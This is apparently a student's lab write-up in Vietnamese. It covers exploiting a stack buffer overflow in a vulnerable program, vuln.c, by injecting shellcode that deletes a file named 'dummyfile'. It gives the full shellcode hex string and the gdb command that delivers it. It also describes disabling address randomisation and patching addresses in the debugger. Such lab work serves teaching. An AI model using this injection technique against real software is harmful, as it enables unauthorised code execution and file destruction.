<h1>Phan Dinh Trung - 22110083</h1>

# DELETE DUMMYFILE USING INJECTION CODE

- ## Stack frame of vuln.c:

  ![image](https://github.com/user-attachments/assets/8854fe7e-d8d2-4165-a697-6d20eed9755a)

- ## Tạo `dummyfile`

![Screenshot 2024-09-20 201411](https://github.com/user-attachments/assets/9204e5f5-7ce2-4180-87d3-ea17e4e0fd0a)

- ## Thay đổi shell `/bin/sh`, tắt ngẫu nhiên địa chỉ của hệ điều hành, biên dịch và liên kết mã file_del.asm, sử dụng `for i in $(objdump -d file_del grep "^" cut -f2); do echo -n 'x'$i; done; echo` để lấy địa chỉ mã lệnh trong tệp file_del và in chúng dưới dạng hex

![Screenshot 2024-09-20 201759](https://github.com/user-attachments/assets/75cbbe42-ce9d-413a-81bf-5dc7f45ebc8f)

- ## đặt 2 điểm break tại `0x0804843` và `0x0804846b` để xem sự khác biệt khi ta chạy chương trình

![Screenshot 2024-09-20 201855](https://github.com/user-attachments/assets/85a8f384-303e-45ec-9835-35bd5f629b88)

![Screenshot 2024-09-20 201952](https://github.com/user-attachments/assets/131e9e32-d233-4775-905b-620fb2b7079e)

- ## chạy chương trình với câu lệnh `r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xaa\xaa\xaa\xaa')")`

![Screenshot 2024-09-20 202207](https://github.com/user-attachments/assets/1bff1fe8-0155-45fd-8b1e-4fd0acacd3f4)

![Screenshot 2024-09-20 202246](https://github.com/user-attachments/assets/708b3980-4ce4-49e1-a417-95987ec4d4f8)

## => Ta thấy tại break 2 thì chỉ có 3 giá trị đầu tiên là giống với hexstring mà ta đưa vào chương trình, còn lại mọi thứ đều khác.

- ## `\x0a` là \n trong hexstring

## => Vì vậy ta nên thay đổi lại đoạn code.

- ## Code ban đầu:

![Screenshot 2024-09-20 202414](https://github.com/user-attachments/assets/7488a3f6-6352-4843-9206-300e803cc4be)

- ## Code sau khi đã thay đổi

  ![Screenshot 2024-09-20 202835](https://github.com/user-attachments/assets/d6f3359d-70b5-4b86-a439-570c44e8da2d)

- ## Chạy lại chương trình. Lúc này ta thấy đã truyền đúng

  ![Screenshot 2024-09-20 203911](https://github.com/user-attachments/assets/a537b1c0-c035-42cb-b567-9d0df2495506)

- ## ta thay đổi địa chỉ `0xffffd68c` thành địa chỉ của esp `0xffffd648`, và địa chỉ `0xffffd66b` thành `\x00` rồi tiếp tục chương trình

![Screenshot 2024-09-20 204250](https://github.com/user-attachments/assets/0d8b8bde-0d69-47a3-9014-fc52dbcc4564)

- ## Tuy vậy khi ta kiểm tra thì file `dummyfile` vẫn còn

  ![Screenshot 2024-09-20 204319](https://github.com/user-attachments/assets/4156ab0f-32b8-40a4-a7ae-c3f1cb7ed28b)

- ## Kiểm tra `file-del`

![Screenshot 2024-09-20 204413](https://github.com/user-attachments/assets/3d04b84d-9d9d-4f82-94a4-e92599f68179)

- ## Ta thấy dummyfile được lưu trữ tại địa chỉ `0x0804807a`, và lệnh `mov $0x804807a, %ebx`, vì vật, việc xóa thực chất chỉ là làm thanh ghi `ebx` không còn chỉ đến địa chỉ nó nữa. vì thế ta cần đặt lại địa chỉ `dummyfile` trong chương trình đến địa chỉ của `ebx`.

  ![Screenshot 2024-09-20 205459](https://github.com/user-attachments/assets/51868926-5de8-494d-b022-fffdc1efc075)

- ## Kết quả:

  ![Screenshot 2024-09-20 205521](https://github.com/user-attachments/assets/186d71f4-e244-4244-8640-f6727f9781b9)

## => Ta đã xóa được file `dummyfile`
